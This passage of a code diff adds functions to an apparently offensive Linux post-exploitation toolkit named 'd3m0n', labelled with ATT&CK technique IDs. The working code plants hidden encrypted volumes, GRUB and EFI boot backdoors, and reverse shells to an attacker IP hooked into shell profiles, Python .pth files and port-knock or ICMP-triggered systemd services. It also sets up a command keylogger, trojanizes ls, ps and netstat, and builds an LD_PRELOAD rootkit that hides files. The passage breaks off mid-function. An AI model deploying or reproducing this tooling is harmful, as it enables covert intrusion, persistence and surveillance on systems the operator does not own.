+            echo -e "${GREEN}[+] Cert: ${CA_DIR}/${DOMAIN}.crt / Key: ${CA_DIR}/${DOMAIN}.key${NC}"
+            ;;
+        3)
+            rm -f /usr/local/share/ca-certificates/system-update-ca.crt 2>/dev/null
+            update-ca-certificates 2>/dev/null
+            rm -f /etc/pki/ca-trust/source/anchors/system-update-ca.crt 2>/dev/null
+            update-ca-trust 2>/dev/null
+            rm -rf "$CA_DIR"
+            echo -e "${GREEN}[+] Rogue CA removed.${NC}"
+            ;;
+    esac
+}
+
+hiddenFS(){
+    echo " [*] T1564.005 — Hidden Encrypted Filesystem [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+
+    echo -e "  ${CYAN}[1]${NC} Create encrypted volume"
+    echo -e "  ${CYAN}[2]${NC} Mount existing volume"
+    echo -e "  ${CYAN}[3]${NC} Unmount volume"
+    echo -e "  ${CYAN}[4]${NC} Emergency wipe (destroy LUKS header)"
+    echo -e "  ${CYAN}[5]${NC} Auto-mount via systemd"
+    read -p "Choice [1-5]: " OPT
+    case "$OPT" in
+        1)
+            read -p "Volume file path [/var/.system_cache.img]: " VF; VF="${VF:-/var/.system_cache.img}"
+            read -p "Size in MB [256]: " SZ; SZ="${SZ:-256}"
+            read -p "Mount point [/mnt/.d3m0n_vault]: " MP; MP="${MP:-/mnt/.d3m0n_vault}"
+            read -p "LUKS passphrase: " -s PASS; echo ""
+            dd if=/dev/urandom of="$VF" bs=1M count="$SZ" status=progress 2>/dev/null
+            echo -n "$PASS" | cryptsetup luksFormat "$VF" --batch-mode -d - 2>/dev/null
+            echo -n "$PASS" | cryptsetup luksOpen "$VF" d3m0n_vault -d - 2>/dev/null
+            mkfs.ext4 /dev/mapper/d3m0n_vault 2>/dev/null
+            mkdir -p "$MP"; mount /dev/mapper/d3m0n_vault "$MP"
+            echo -e "${GREEN}[+] Encrypted volume mounted at ${MP}${NC}"
+            ;;
+        2)
+            read -p "Volume file: " VF; read -p "Mount point: " MP; read -p "Passphrase: " -s PASS; echo ""
+            echo -n "$PASS" | cryptsetup luksOpen "$VF" d3m0n_vault -d - 2>/dev/null
+            mkdir -p "$MP"; mount /dev/mapper/d3m0n_vault "$MP"
+            echo -e "${GREEN}[+] Mounted at ${MP}${NC}"
+            ;;
+        3)
+            umount /dev/mapper/d3m0n_vault 2>/dev/null; cryptsetup luksClose d3m0n_vault 2>/dev/null
+            echo -e "${GREEN}[+] Unmounted.${NC}"
+            ;;
+        4)
+            read -p "Volume file to DESTROY: " VF
+            echo -e "${RED}[!] THIS WILL PERMANENTLY DESTROY ALL DATA!${NC}"
+            read -p "Type 'DESTROY' to confirm: " CONF
+            [[ "$CONF" == "DESTROY" ]] && { dd if=/dev/urandom of="$VF" bs=1M count=2 conv=notrunc 2>/dev/null; echo -e "${GREEN}[+] LUKS header destroyed.${NC}"; } || echo "Aborted."
+            ;;
+        5)
+            read -p "Volume file: " VF; read -p "Mount point: " MP
+            read -p "Key file path (will be created) [/root/.vault.key]: " KF; KF="${KF:-/root/.vault.key}"
+            dd if=/dev/urandom of="$KF" bs=256 count=1 2>/dev/null; chmod 400 "$KF"
+            read -p "Current passphrase: " -s PASS; echo ""
+            echo -n "$PASS" | cryptsetup luksAddKey "$VF" "$KF" -d - 2>/dev/null
+            cat > /etc/systemd/system/d3m0n-vault.service << SVEOF
+[Unit]
+Description=System Cache Volume
+After=local-fs.target
+[Service]
+Type=oneshot
+RemainAfterExit=yes
+ExecStart=/bin/bash -c 'cryptsetup luksOpen ${VF} d3m0n_vault --key-file ${KF} && mkdir -p ${MP} && mount /dev/mapper/d3m0n_vault ${MP}'
+ExecStop=/bin/bash -c 'umount ${MP}; cryptsetup luksClose d3m0n_vault'
+[Install]
+WantedBy=multi-user.target
+SVEOF
+            systemctl daemon-reload && systemctl enable d3m0n-vault.service 2>/dev/null
+            echo -e "${GREEN}[+] Auto-mount configured.${NC}"
+            ;;
+    esac
+}
+
+bootkitPersist(){
+    echo " [*] T1542.003 — Bootkit / Bootloader Persistence [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "${RED}[!] WARNING: Bootloader modification can BRICK the system!${NC}"
+    echo -e "${RED}[!] Ensure you have physical access or out-of-band recovery.${NC}"
+    read -p "Type 'I UNDERSTAND' to continue: " ACK
+    [[ "$ACK" != "I UNDERSTAND" ]] && { echo "Aborted."; return; }
+
+    BOOT_BACKUP="/root/.d3m0n_boot_backup"
+    mkdir -p "$BOOT_BACKUP" 2>/dev/null
+
+    echo -e "  ${CYAN}[1]${NC} GRUB2 40_custom module injection"
+    echo -e "  ${CYAN}[2]${NC} GRUB2 hidden menu entry (root shell)"
+    echo -e "  ${CYAN}[3]${NC} Kernel boot parameter injection"
+    echo -e "  ${CYAN}[4]${NC} EFI System Partition backdoor"
+    echo -e "  ${CYAN}[5]${NC} Restore backups"
+    read -p "Choice [1-5]: " OPT
+    case "$OPT" in
+        1)
+            [[ ! -f /etc/grub.d/40_custom ]] && { echo "GRUB2 not found."; return; }
+            cp /etc/grub.d/40_custom "${BOOT_BACKUP}/40_custom.bak"
+            read -p "Command to execute at boot (e.g. reverse shell one-liner): " CMD
+            cat >> /etc/grub.d/40_custom << GEOF
+
+menuentry "System Recovery Mode" --unrestricted {
+    insmod ext2
+    set root='hd0,msdos1'
+    linux /vmlinuz root=/dev/sda1 ro init=/bin/bash
+}
+GEOF
+            update-grub 2>/dev/null || grub2-mkconfig -o /boot/grub2/grub.cfg 2>/dev/null
+            echo -e "${GREEN}[+] GRUB2 custom entry added. Hidden 'System Recovery Mode' menu entry.${NC}"
+            ;;
+        2)
+            cp /etc/default/grub "${BOOT_BACKUP}/grub_default.bak" 2>/dev/null
+            [[ -f /etc/grub.d/40_custom ]] && cp /etc/grub.d/40_custom "${BOOT_BACKUP}/40_custom.bak"
+            cat >> /etc/grub.d/40_custom << 'GEOF'
+
+menuentry "  " --unrestricted {
+    insmod ext2
+    set root='hd0,msdos1'
+    linux /vmlinuz root=/dev/sda1 ro init=/bin/bash
+    initrd /initrd.img
+}
+GEOF
+            update-grub 2>/dev/null || grub2-mkconfig -o /boot/grub2/grub.cfg 2>/dev/null
+            echo -e "${GREEN}[+] Hidden GRUB2 menu entry (blank name) drops to root shell via init=/bin/bash${NC}"
+            ;;
+        3)
+            cp /etc/default/grub "${BOOT_BACKUP}/grub_default.bak"
+            read -p "Kernel parameter to inject (e.g. 'init=/bin/bash' or 'rdinit=/tmp/payload'): " KPARAM
+            if grep -q "^GRUB_CMDLINE_LINUX=" /etc/default/grub; then
+                sed -i "s|^GRUB_CMDLINE_LINUX=\"\(.*\)\"|GRUB_CMDLINE_LINUX=\"\1 ${KPARAM}\"|" /etc/default/grub
+            else
+                echo "GRUB_CMDLINE_LINUX=\"${KPARAM}\"" >> /etc/default/grub
+            fi
+            update-grub 2>/dev/null || grub2-mkconfig -o /boot/grub2/grub.cfg 2>/dev/null
+            echo -e "${GREEN}[+] Kernel parameter injected: ${KPARAM}${NC}"
+            ;;
+        4)
+            ESP=$(findmnt -n -o TARGET /boot/efi 2>/dev/null || echo "/boot/efi")
+            [[ ! -d "$ESP" ]] && { echo "EFI System Partition not found."; return; }
+            EFI_DIR="${ESP}/EFI"
+            cp -r "$EFI_DIR" "${BOOT_BACKUP}/EFI_backup" 2>/dev/null
+            read -p "Path to malicious .efi binary: " MEFI
+            [[ ! -f "$MEFI" ]] && { echo "File not found."; return; }
+            mkdir -p "${EFI_DIR}/Recovery" 2>/dev/null
+            cp "$MEFI" "${EFI_DIR}/Recovery/bootx64.efi"
+            DISK=$(findmnt -n -o SOURCE /boot/efi 2>/dev/null | head -1)
+            efibootmgr -c -d "${DISK%[0-9]*}" -p "${DISK##*[a-z]}" -L "System Recovery" \
+                -l "\\EFI\\Recovery\\bootx64.efi" 2>/dev/null
+            echo -e "${GREEN}[+] EFI backdoor installed at ${EFI_DIR}/Recovery/bootx64.efi${NC}"
+            ;;
+        5)
+            echo -e "${CYAN}[*] Restoring backups...${NC}"
+            [[ -f "${BOOT_BACKUP}/40_custom.bak" ]] && cp "${BOOT_BACKUP}/40_custom.bak" /etc/grub.d/40_custom
+            [[ -f "${BOOT_BACKUP}/grub_default.bak" ]] && cp "${BOOT_BACKUP}/grub_default.bak" /etc/default/grub
+            [[ -d "${BOOT_BACKUP}/EFI_backup" ]] && {
+                ESP=$(findmnt -n -o TARGET /boot/efi 2>/dev/null || echo "/boot/efi")
+                cp -r "${BOOT_BACKUP}/EFI_backup"/* "${ESP}/EFI/" 2>/dev/null
+                rm -rf "${ESP}/EFI/Recovery" 2>/dev/null
+                efibootmgr 2>/dev/null | grep "System Recovery" | grep -oP 'Boot\K[0-9]+' | while read n; do
+                    efibootmgr -b "$n" -B 2>/dev/null
+                done
+            }
+            update-grub 2>/dev/null || grub2-mkconfig -o /boot/grub2/grub.cfg 2>/dev/null
+            echo -e "${GREEN}[+] Bootloader restored from backups.${NC}"
+            ;;
+    esac
+}
+
+trapPersist(){
+    echo " [*] T1546.005 — Trap Command Persistence [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    TRAP_MARKER="# D3M0N_TRAP"
+    BACKUP_SUFFIX=".d3m0n_trap_bak"
+
+    _inject_trap() {
+        local profile="$1" trap_type="$2" payload="$3" desc="$4"
+        [[ ! -f "$profile" ]] && touch "$profile"
+        grep -q "$TRAP_MARKER" "$profile" 2>/dev/null && { echo -e "${YELLOW}  [!] Already in ${profile}${NC}"; return 1; }
+        local orig_ts; orig_ts=$(stat -c %Y "$profile" 2>/dev/null)
+        cp "$profile" "${profile}${BACKUP_SUFFIX}" 2>/dev/null
+        printf '\n%s_%s\n# System event handler — %s\ntrap '\''%s'\'' %s\n' "$TRAP_MARKER" "$trap_type" "$desc" "$payload" "$trap_type" >> "$profile"
+        [[ -n "$orig_ts" ]] && touch -d "@${orig_ts}" "$profile" 2>/dev/null
+        echo -e "${GREEN}  [+] ${trap_type} trap injected into ${profile}${NC}"
+    }
+
+    _pick_profile() {
+        echo "  [1] ~/.bashrc  [2] ~/.bash_profile  [3] /etc/profile  [4] Custom"
+        read -p "Profile: " pc
+        case "$pc" in
+            1) echo "$HOME/.bashrc" ;; 2) echo "$HOME/.bash_profile" ;; 3) echo "/etc/profile" ;;
+            4) read -p "Path: " cp; echo "$cp" ;; *) echo "" ;;
+        esac
+    }
+
+    echo -e "  ${CYAN}[1]${NC} DEBUG trap (every command)  ${CYAN}[2]${NC} EXIT trap (shell close)"
+    echo -e "  ${CYAN}[3]${NC} ERR trap (on errors)        ${CYAN}[4]${NC} RETURN trap"
+    echo -e "  ${CYAN}[5]${NC} Preset: Revshell on EXIT    ${CYAN}[6]${NC} Preset: Keylogger via DEBUG"
+    echo -e "  ${CYAN}[7]${NC} Cleanup"
+    read -p "Choice [1-7]: " OPT
+    case "$OPT" in
+        1) read -p "Payload: " PL; P=$(_pick_profile); [[ -n "$P" ]] && _inject_trap "$P" DEBUG "$PL" "debug hooks" ;;
+        2) read -p "Payload: " PL; P=$(_pick_profile); [[ -n "$P" ]] && _inject_trap "$P" EXIT "$PL" "cleanup handler" ;;
+        3) read -p "Payload: " PL; P=$(_pick_profile); [[ -n "$P" ]] && _inject_trap "$P" ERR "$PL" "error handler" ;;
+        4) read -p "Payload: " PL; P=$(_pick_profile); [[ -n "$P" ]] && _inject_trap "$P" RETURN "$PL" "return handler" ;;
+        5)
+            read -p "Attacker IP: " LH; read -p "Port: " LP
+            PL="nohup bash -c 'sleep 3 && bash -i >& /dev/tcp/${LH}/${LP} 0>&1' &>/dev/null &"
+            echo "  [1] ~/.bashrc  [2] /etc/profile"; read -p "Choice: " pc
+            P="$HOME/.bashrc"; [[ "$pc" == "2" ]] && P="/etc/profile"
+            _inject_trap "$P" EXIT "$PL" "cleanup handler"
+            ;;
+        6)
+            LF="/tmp/.$(cat /dev/urandom | tr -dc 'a-z' | head -c8)"
+            PL="echo \"\$(date +%s) \$(whoami) \$(pwd) \$BASH_COMMAND\" >> ${LF}"
+            echo "  [1] ~/.bashrc  [2] /etc/profile"; read -p "Choice: " pc
+            P="$HOME/.bashrc"; [[ "$pc" == "2" ]] && P="/etc/profile"
+            _inject_trap "$P" DEBUG "$PL" "debug hooks"
+            echo -e "${GREEN}[+] Keylogger → ${LF}${NC}"
+            ;;
+        7)
+            for p in "$HOME/.bashrc" "$HOME/.bash_profile" "$HOME/.profile" "$HOME/.zshrc" "/etc/profile"; do
+                if [[ -f "$p" ]] && grep -q "$TRAP_MARKER" "$p" 2>/dev/null; then
+                    if [[ -f "${p}${BACKUP_SUFFIX}" ]]; then cp "${p}${BACKUP_SUFFIX}" "$p"; rm -f "${p}${BACKUP_SUFFIX}"
+                    else sed -i "/${TRAP_MARKER}/,+2d" "$p"; fi
+                    echo -e "${GREEN}  [+] Cleaned: ${p}${NC}"
+                fi
+            done
+            ;;
+        *) echo "[ERROR] Invalid" ;;
+    esac
+}
+
+pythonPersist(){
+    echo " [*] T1546.018 — Python Startup Hooks [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    MARKER="# d3m0n_python_hook"
+
+    _find_sp() {
+        for pybin in python3 python; do
+            command -v "$pybin" &>/dev/null || continue
+            "$pybin" -c "import site; print(site.getsitepackages()[0])" 2>/dev/null
+        done | sort -u
+    }
+
+    echo -e "  ${CYAN}[1]${NC} .pth file injection     ${CYAN}[2]${NC} usercustomize.py (per-user)"
+    echo -e "  ${CYAN}[3]${NC} sitecustomize.py (root)  ${CYAN}[4]${NC} Stealth .pth revshell"
+    echo -e "  ${CYAN}[5]${NC} Cleanup"
+    read -p "Choice [1-5]: " OPT
+    case "$OPT" in
+        1)
+            read -p "Python payload: " PL; read -p ".pth name [system-path-config]: " PN
+            PN="${PN:-system-path-config}"
+            SP=$(_find_sp | head -1)
+            [[ -z "$SP" ]] && { echo "No site-packages found."; return; }
+            mkdir -p "$SP" 2>/dev/null
+            echo "import os; os.system('${PL}')" > "${SP}/${PN}.pth"
+            echo "$MARKER" >> "${SP}/${PN}.pth"
+            chmod 644 "${SP}/${PN}.pth"
+            echo -e "${GREEN}[+] Created: ${SP}/${PN}.pth${NC}"
+            ;;
+        2)
+            read -p "Callback URL: " CB
+            USP=$(python3 -c "import site; print(site.getusersitepackages())" 2>/dev/null)
+            USP="${USP:-$HOME/.local/lib/python3/dist-packages}"
+            mkdir -p "$USP" 2>/dev/null
+            cat > "${USP}/usercustomize.py" << PYEOF
+${MARKER}
+import os, socket
+try: os.system('curl -s ${CB}/beacon?host=' + socket.gethostname() + ' &')
+except: pass
+PYEOF
+            echo -e "${GREEN}[+] Created: ${USP}/usercustomize.py${NC}"
+            ;;
+        3)
+            [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+            read -p "Python payload (one line): " PL
+            for sp in $(_find_sp); do
+                [[ -d "$sp" ]] || continue
+                echo -e "${MARKER}\n${PL}" >> "${sp}/sitecustomize.py"
+                echo -e "${GREEN}  [+] Injected: ${sp}/sitecustomize.py${NC}"
+            done
+            ;;
+        4)
+            read -p "Revshell IP: " LH; read -p "Port: " LP
+            SP=$(_find_sp | head -1)
+            [[ -z "$SP" ]] && { echo "No site-packages."; return; }
+            local NAMES=("_distutils_hack" "certifi-paths" "easy-install" "pkg_resources_init")
+            local N="${NAMES[$((RANDOM % ${#NAMES[@]}))]}"
+            echo "import os; os.system('(nohup bash -c \"bash -i >& /dev/tcp/${LH}/${LP} 0>&1\" &>/dev/null &) 2>/dev/null')" > "${SP}/${N}.pth"
+            echo -e "${GREEN}[+] Stealth .pth: ${SP}/${N}.pth${NC}"
+            ;;
+        5)
+            for sp in $(_find_sp); do
+                for f in "$sp"/*.pth; do [[ -f "$f" ]] && grep -q "$MARKER" "$f" && rm -f "$f" && echo "Removed: $f"; done
+                for f in usercustomize.py sitecustomize.py; do
+                    [[ -f "${sp}/${f}" ]] && grep -q "$MARKER" "${sp}/${f}" && rm -f "${sp}/${f}" && echo "Removed: ${sp}/${f}"
+                done
+            done
+            ;;
+    esac
+}
+
+socketFilter(){
+    echo " [*] T1205.002 — Port Knocking / Socket Filter [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    KNOCK_DIR="/etc/.d3m0n_knock"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+
+    echo -e "  ${CYAN}[1]${NC} Classic port knock (iptables)"
+    echo -e "  ${CYAN}[2]${NC} Single-packet auth (magic string)"
+    echo -e "  ${CYAN}[3]${NC} ICMP knock (ping sizes)"
+    echo -e "  ${CYAN}[4]${NC} Cleanup"
+    read -p "Choice [1-4]: " OPT
+    case "$OPT" in
+        1)
+            read -p "Knock ports (space-sep, e.g. '7000 8000 9000'): " KS
+            read -p "Protected port (e.g. 22): " PP
+            read -p "Open duration secs [30]: " OT; OT="${OT:-30}"
+            local -a PORTS=($KS); local NP=${#PORTS[@]}; local i=1
+            iptables-save > "${KNOCK_DIR}/iptables.bak" 2>/dev/null
+            mkdir -p "$KNOCK_DIR" 2>/dev/null
+            iptables -A INPUT -p tcp --dport "$PP" -j DROP 2>/dev/null
+            for port in "${PORTS[@]}"; do
+                if [[ $i -eq 1 ]]; then iptables -A INPUT -p tcp --dport "$port" -m recent --name KNOCK1 --set -j DROP
+                elif [[ $i -eq $NP ]]; then
+                    iptables -I INPUT -p tcp --dport "$PP" -m recent --name "KNOCK${i}" --rcheck --seconds "$OT" -j ACCEPT
+                    iptables -A INPUT -p tcp --dport "$port" -m recent --name "KNOCK$((i-1))" --rcheck --seconds 10 -m recent --name "KNOCK${i}" --set -j DROP
+                else iptables -A INPUT -p tcp --dport "$port" -m recent --name "KNOCK$((i-1))" --rcheck --seconds 10 -m recent --name "KNOCK${i}" --set -j DROP
+                fi; i=$((i+1))
+            done
+            echo -e "${GREEN}[+] Port knock: ${KS} → port ${PP}${NC}"
+            ;;
+        2)
+            read -p "Listen port [53]: " SP; SP="${SP:-53}"
+            read -p "Magic string: " MS
+            read -p "Action [1=SSH 2=Revshell 3=Custom]: " AC
+            local ACMD=""
+            case "$AC" in
+                1) ACMD="iptables -I INPUT -p tcp --dport 22 -j ACCEPT; sleep 60; iptables -D INPUT -p tcp --dport 22 -j ACCEPT" ;;
+                2) read -p "Host:Port: " RS; ACMD="bash -i >& /dev/tcp/${RS%%:*}/${RS##*:} 0>&1" ;;
+                3) read -p "Command: " ACMD ;;
+            esac
+            mkdir -p "$KNOCK_DIR" 2>/dev/null
+            cat > "${KNOCK_DIR}/spa_listener.sh" << SEOF
+#!/bin/bash
+while true; do DATA=\$(ncat -l -p "${SP}" -w 5 2>/dev/null || nc -l -p "${SP}" -w 5 2>/dev/null)
+[[ "\$DATA" == *"${MS}"* ]] && { ${ACMD} & }; done
+SEOF
+            chmod 700 "${KNOCK_DIR}/spa_listener.sh"
+            cat > /etc/systemd/system/d3m0n-spa.service << SVEOF
+[Unit]
+Description=System Packet Analyzer
+After=network.target
+[Service]
+Type=simple
+ExecStart=/bin/bash ${KNOCK_DIR}/spa_listener.sh
+Restart=always
+[Install]
+WantedBy=multi-user.target
+SVEOF
+            systemctl daemon-reload && systemctl enable --now d3m0n-spa.service 2>/dev/null
+            echo -e "${GREEN}[+] SPA on port ${SP}. Auth: echo '${MS}' | nc -w1 TARGET ${SP}${NC}"
+            ;;
+        3)
+            read -p "ICMP sizes (space-sep, e.g. '64 128 256'): " IS
+            read -p "Action [1=SSH 2=Revshell 3=Custom]: " AC
+            local ACMD=""
+            case "$AC" in
+                1) ACMD="iptables -I INPUT -p tcp --dport 22 -j ACCEPT; sleep 60; iptables -D INPUT -p tcp --dport 22 -j ACCEPT" ;;
+                2) read -p "Host:Port: " RS; ACMD="bash -i >& /dev/tcp/${RS%%:*}/${RS##*:} 0>&1" ;;
+                3) read -p "Command: " ACMD ;;
+            esac
+            mkdir -p "$KNOCK_DIR" 2>/dev/null
+            cat > "${KNOCK_DIR}/icmp_knock.sh" << 'IKEOF'
+#!/bin/bash
+EXPECTED=(SIZES_PH); ACTION="ACTION_PH"; STATE=0; LT=$(date +%s)
+tcpdump -lni any icmp 2>/dev/null | while IFS= read -r line; do
+SZ=$(echo "$line"|grep -oP 'length \K[0-9]+'); [[ -z "$SZ" ]] && continue
+NOW=$(date +%s); (( NOW-LT>10 )) && STATE=0; LT=$NOW
+[[ "$SZ" == "${EXPECTED[$STATE]}" ]] && STATE=$((STATE+1))
+[[ $STATE -eq ${#EXPECTED[@]} ]] && { eval "$ACTION" &; STATE=0; }
+done
+IKEOF
+            sed -i "s|SIZES_PH|${IS}|;s|ACTION_PH|${ACMD}|" "${KNOCK_DIR}/icmp_knock.sh"
+            chmod 700 "${KNOCK_DIR}/icmp_knock.sh"
+            cat > /etc/systemd/system/d3m0n-icmpknock.service << SVEOF
+[Unit]
+Description=ICMP Network Monitor
+After=network.target
+[Service]
+Type=simple
+ExecStart=/bin/bash ${KNOCK_DIR}/icmp_knock.sh
+Restart=always
+[Install]
+WantedBy=multi-user.target
+SVEOF
+            systemctl daemon-reload && systemctl enable --now d3m0n-icmpknock.service 2>/dev/null
+            echo -e "${GREEN}[+] ICMP knock active. Sizes: ${IS}${NC}"
+            ;;
+        4)
+            systemctl stop d3m0n-spa d3m0n-icmpknock 2>/dev/null
+            systemctl disable d3m0n-spa d3m0n-icmpknock 2>/dev/null
+            rm -f /etc/systemd/system/d3m0n-spa.service /etc/systemd/system/d3m0n-icmpknock.service
+            [[ -f "${KNOCK_DIR}/iptables.bak" ]] && iptables-restore < "${KNOCK_DIR}/iptables.bak"
+            rm -rf "$KNOCK_DIR"; systemctl daemon-reload 2>/dev/null
+            echo -e "${GREEN}[+] Knock services removed.${NC}"
+            ;;
+    esac
+}
+
+binaryReplace(){
+    echo " [*] T1554 — Trojanize System Binaries [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    HIDE_DIR="/usr/lib/.d3m0n_orig"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+
+    echo -e "  ${CYAN}[1]${NC} Replace binaries (filter attacker artifacts)"
+    echo -e "  ${CYAN}[2]${NC} Restore originals"
+    echo -e "  ${CYAN}[3]${NC} Status check"
+    read -p "Choice [1-3]: " OPT
+    case "$OPT" in
+        1)
+            read -p "Hide prefix (files/dirs starting with this are hidden) [.d3m0n]: " HPFX
+            HPFX="${HPFX:-.d3m0n}"
+            read -p "Hide PID (process name to hide, e.g. 'backdoor') [none]: " HPID
+            read -p "Hide user [none]: " HUSR
+            read -p "Hide connection port [none]: " HPORT
+            mkdir -p "$HIDE_DIR" 2>/dev/null
+            chmod 700 "$HIDE_DIR"
+            BINS=(ls find ps netstat ss who w last lsof)
+            for bin in "${BINS[@]}"; do
+                BPATH=$(command -v "$bin" 2>/dev/null); [[ -z "$BPATH" ]] && continue
+                [[ -f "${HIDE_DIR}/$(basename "$BPATH")" ]] && continue
+                cp "$BPATH" "${HIDE_DIR}/$(basename "$BPATH")"
+                cat > "$BPATH" << WEOF
+#!/bin/bash
+ORIG="${HIDE_DIR}/$(basename "$BPATH")"
+OUTPUT=\$("\$ORIG" "\$@" 2>&1)
+WEOF
+                [[ -n "$HPFX" ]] && echo "OUTPUT=\$(echo \"\$OUTPUT\" | grep -v \"${HPFX}\")" >> "$BPATH"
+                [[ -n "$HPID" ]] && echo "OUTPUT=\$(echo \"\$OUTPUT\" | grep -v \"${HPID}\")" >> "$BPATH"
+                [[ -n "$HUSR" ]] && echo "OUTPUT=\$(echo \"\$OUTPUT\" | grep -v \"${HUSR}\")" >> "$BPATH"
+                [[ -n "$HPORT" ]] && echo "OUTPUT=\$(echo \"\$OUTPUT\" | grep -v \"${HPORT}\")" >> "$BPATH"
+                echo 'echo "$OUTPUT"' >> "$BPATH"
+                chmod 755 "$BPATH"
+                echo -e "${GREEN}  [+] Replaced: ${BPATH}${NC}"
+            done
+            ;;
+        2)
+            [[ ! -d "$HIDE_DIR" ]] && { echo "No backups found."; return; }
+            for orig in "$HIDE_DIR"/*; do
+                [[ -f "$orig" ]] || continue
+                BN=$(basename "$orig"); DEST=$(command -v "$BN" 2>/dev/null || echo "/usr/bin/$BN")
+                cp "$orig" "$DEST" && chmod 755 "$DEST"
+                echo -e "${GREEN}  [+] Restored: ${DEST}${NC}"
+            done
+            rm -rf "$HIDE_DIR"
+            ;;
+        3)
+            if [[ -d "$HIDE_DIR" ]]; then
+                echo "Trojanized binaries:"; ls "$HIDE_DIR"
+            else echo "No trojanized binaries found."; fi
+            ;;
+    esac
+}
+
+ldsoPreload(){
+    echo " [*] T1574.006 — System-Wide /etc/ld.so.preload [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    PRELOAD_DIR="/usr/lib/.d3m0n_preload"
+    SO_NAME="libsystem_helper.so"
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+
+    echo -e "  ${CYAN}[1]${NC} Install (compile & deploy .so)"
+    echo -e "  ${CYAN}[2]${NC} Uninstall"
+    echo -e "  ${CYAN}[3]${NC} Status"
+    read -p "Choice [1-3]: " OPT
+    case "$OPT" in
+        1)
+            command -v gcc &>/dev/null || { echo "gcc required."; return; }
+            read -p "Hide file prefix [.d3m0n]: " HPFX; HPFX="${HPFX:-.d3m0n}"
+            read -p "Hide process name [none]: " HPROC
+            mkdir -p "$PRELOAD_DIR" 2>/dev/null
+            cat > "${PRELOAD_DIR}/preload.c" << 'CEOF'
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dlfcn.h>
+#include <dirent.h>
+
+#ifndef HIDE_PREFIX
+#define HIDE_PREFIX ".d3m0n"
+#endif
+
+struct dirent *readdir(DIR *dirp) {
+    struct dirent *(*orig_readdir)(DIR *) = dlsym(RTLD_NEXT, "readdir");
+    struct dirent *entry;
+    while ((entry = orig_readdir(dirp)) != NULL) {
+        if (strstr(entry->d_name, HIDE_PREFIX) != NULL) continue;
+        break;
+    }
+    return entry;
+}
+
+struct dirent64 *readdir64(DIR *dirp) {
+    struct dirent64 *(*orig_readdir64)(DIR *) = dlsym(RTLD_NEXT, "readdir64");
+    struct dirent64 *entry;
+    while ((entry = orig_readdir64(dirp)) != NULL) {
+        if (strstr(entry->d_name, HIDE_PREFIX) != NULL) continue;
+        break;
+    }
+    return entry;
+}
+CEOF
+            gcc -shared -fPIC -o "${PRELOAD_DIR}/${SO_NAME}" "${PRELOAD_DIR}/preload.c" \
+                -ldl -DHIDE_PREFIX="\"${HPFX}\"" 2>/dev/null
+            if [[ $? -eq 0 ]]; then
+                echo "${PRELOAD_DIR}/${SO_NAME}" >> /etc/ld.so.preload
+                echo -e "${GREEN}[+] Installed: ${PRELOAD_DIR}/${SO_NAME} → /etc/ld.so.preload${NC}"
+            else echo -e "${RED}[!] Compilation failed.${NC}"; fi
+            ;;
+        2)
+            sed -i "\|${PRELOAD_DIR}|d" /etc/ld.so.preload 2>/dev/null
+            rm -rf "$PRELOAD_DIR"
+            [[ ! -s /etc/ld.so.preload ]] && rm -f /etc/ld.so.preload
+            echo -e "${GREEN}[+] Removed.${NC}"
+            ;;
+        3)
+            if grep -q "$PRELOAD_DIR" /etc/ld.so.preload 2>/dev/null; then
+                echo -e "${GREEN}Active: $(grep "$PRELOAD_DIR" /etc/ld.so.preload)${NC}"
+            else echo "Not installed."; fi
+            ;;
+    esac
+}
+
+systemdTimerPersist(){
+    echo " [*] T1053.006 — Systemd Timer Persistence [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+
+    echo -e "  ${CYAN}[1]${NC} Create persistent timer"
+    echo -e "  ${CYAN}[2]${NC} List d3m0n timers"
+    echo -e "  ${CYAN}[3]${NC} Remove timer"
+    read -p "Choice [1-3]: " OPT
+    case "$OPT" in
+        1)
+            read -p "Timer name (e.g. system-maintenance): " TN; TN="${TN:-system-maintenance}"
+            read -p "Interval [1=Every 15min 2=Hourly 3=Daily 4=On boot 5=Custom]: " IV
+            local ONCAL="" ONBOOT=""
+            case "$IV" in
+                1) ONCAL="*:0/15" ;; 2) ONCAL="hourly" ;; 3) ONCAL="daily" ;;
+                4) ONBOOT="120" ;; 5) read -p "OnCalendar= " ONCAL ;;
+            esac
+            read -p "Command to execute: " CMD
+            [[ -z "$CMD" ]] && { echo "Command required."; return; }
+            cat > "/etc/systemd/system/${TN}.service" << SVEOF
+[Unit]
+Description=System Maintenance Task
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c '${CMD}'
+SVEOF
+            local TIMER_CONTENT="[Unit]\nDescription=System Maintenance Schedule\n[Timer]\n"
+            [[ -n "$ONCAL" ]] && TIMER_CONTENT+="OnCalendar=${ONCAL}\n"
+            [[ -n "$ONBOOT" ]] && TIMER_CONTENT+="OnBootSec=${ONBOOT}\nOnUnitActiveSec=${ONBOOT}\n"
